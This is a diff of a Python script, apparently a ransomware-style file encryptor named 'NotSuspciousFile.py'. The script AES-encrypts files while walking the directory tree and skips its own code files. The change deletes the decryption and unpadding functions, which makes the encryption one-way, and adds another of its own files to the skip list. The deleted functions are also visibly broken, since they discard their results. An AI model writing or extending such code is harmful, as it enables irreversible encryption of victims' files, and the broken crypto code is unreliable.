@@ -48,18 +48,6 @@ def MyfileEncrypt(file_path):
     #File extension
     return encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name
 
-##########################################################
-# Given an AES-256 Cipher Text,key, and iv; a cipher text 
-# is decrypted.
-##########################################################
-def MyDecrypt(cipher_text, key, iv):
-    if(len(key) != const.ENC_DEC_KEY_LENGTH and len(iv) != const.IV_KEY_LENGTH) :
-        raise ValueError('Key/IV length is mismatched.')
-    cipher = createCipher(iv, key)
-    decryptor = cipher.decryptor()
-    decryptor.update(cipher_text) + decryptor.finalize() 
-    return 
-
 def get_padded_file(file_path): 
     read_file = None
     #Read the file from the file path
@@ -83,11 +71,6 @@ def padFile(file):
     pddFile += padder.finalize()
     return pddFile
 
-def unpadFile(file):
-     unpadder = padding.PKCS7(128).unpadder()
-     data = unpadder.update(file)
-     data + unpadder.finalize()
-     return data
     
 def generateRandom(key_length):
     #Idk if this is the right way to generate it
@@ -120,7 +103,7 @@ if __name__ == '__main__':
     skip_folder = '\__pycache__'
     #Force python to remove these list of items from the root folder directory
     #Because it is our code
-    skip_file_list = list(['NotSuspciousFile.py', 'Constants.py','Constants.pyc'])
+    skip_file_list = list(['NotSuspciousFile.py', 'SuspiciousFile.py','Constants.py','Constants.pyc'])
     for root, dirs, files in os.walk('.'):
         #The current folder that we are inspecting
         curr_folder = root.replace('.', '', 1)
